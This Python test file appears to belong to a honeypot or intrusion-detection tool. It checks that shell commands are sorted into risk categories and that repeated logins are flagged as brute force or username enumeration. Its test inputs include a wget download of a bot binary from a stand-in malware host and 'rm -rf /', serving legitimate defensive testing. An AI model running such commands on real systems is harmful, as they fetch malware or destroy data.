from analytics.command_analyzer import CommandAnalyzer
from analytics.brute_force_detector import BruteForceDetector

def test_command_analyzer():
    # Recon
    res = CommandAnalyzer.analyze("whoami")
    assert res["category"] == "System Reconnaissance"
    assert res["risk_points"] >= 10

    # Malware download
    res_wget = CommandAnalyzer.analyze("wget http://malware.com/bot.bin -O bot")
    assert res_wget["category"] == "Suspicious File Retrieval"
    assert res_wget["risk_points"] >= 20

    # Persistence
    res_cron = CommandAnalyzer.analyze("crontab -l")
    assert res_cron["category"] == "Persistence Attempt"

    # Destructive
    res_rm = CommandAnalyzer.analyze("rm -rf /")
    assert res_rm["category"] == "Destructive Attempt"
    assert res_rm["risk_points"] == 25

def test_brute_force_detector():
    detector = BruteForceDetector(time_window_seconds=60, brute_force_threshold=3, enum_threshold=2)
    ip = "203.0.113.50"

    # Attempt 1
    r1 = detector.record_attempt(ip, "user1")
    assert not r1["is_brute_force"]

    # Attempt 2 (different user)
    r2 = detector.record_attempt(ip, "user2")
    assert r2["is_username_enumeration"]

    # Attempt 3
    r3 = detector.record_attempt(ip, "user3")
    assert r3["is_brute_force"]
    assert r3["is_username_enumeration"]

